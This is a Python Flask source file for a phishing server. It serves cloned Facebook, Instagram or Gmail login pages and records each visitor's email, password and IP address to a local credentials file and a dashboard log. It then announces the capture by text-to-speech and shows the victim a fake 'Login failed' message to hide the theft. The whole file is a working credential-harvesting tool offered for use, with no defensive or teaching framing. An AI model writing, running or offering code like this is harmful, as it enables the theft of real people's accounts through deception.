import os
import sys
from flask import Flask, request, send_file
import pyttsx3

# Add logger path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core.logger import log_event

app = Flask(__name__)
TTS = pyttsx3.init()

# Ensure directories
os.makedirs("data/logs", exist_ok=True)
os.makedirs("core/clones", exist_ok=True)

# Pre-cloned phishing templates (basic HTML clones)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

TEMPLATES = {
    "facebook": os.path.join(BASE_DIR, "clones/facebook.html"),
    "instagram": os.path.join(BASE_DIR, "clones/instagram.html"),
    "gmail": os.path.join(BASE_DIR, "clones/gmail.html")
}


# Set this before running
selected_site = None

@app.route("/", methods=["GET", "POST"])
def serve_phish():
    global selected_site

    if not selected_site or selected_site not in TEMPLATES:
        return "<h3>[Error] No phishing template selected.</h3>"

    if request.method == "POST":
        ip = request.remote_addr
        email = request.form.get("email")
        password = request.form.get("password")

        # Log locally
        creds = f"[{selected_site.upper()}] IP: {ip}, Email: {email}, Password: {password}\n"
        with open("data/logs/creds.txt", "a") as f:
            f.write(creds)

        # Log to dashboard
        log_event({
            "module": f"{selected_site.title()} Clone",
            "ip": ip,
            "email": email,
            "password": password,
            "event": "Victim submitted credentials"
        })

        TTS.say(f"{selected_site} target logged in")
        TTS.runAndWait()

        return "<h3>Login failed. Please try again.</h3>"

    # Serve clone template
    return send_file(TEMPLATES[selected_site])

def start_cloner(site):
    global selected_site
    print("\n[🔎] Select a site to clone:")
    print("1. Facebook")
    print("2. Instagram")
    print("3. Gmail")
    choice = input("Select option (1/2/3): ")

    if choice == "1":
        selected_site = "facebook"
    elif choice == "2":
        selected_site = "instagram"
    elif choice == "3":
        selected_site = "gmail"
    else:
        print("[-] Invalid choice. Exiting.")
        return

    print(f"[*] Starting {selected_site.title()} phishing server on http://localhost:5000 ...")
    app.run(host="0.0.0.0", port=5000)

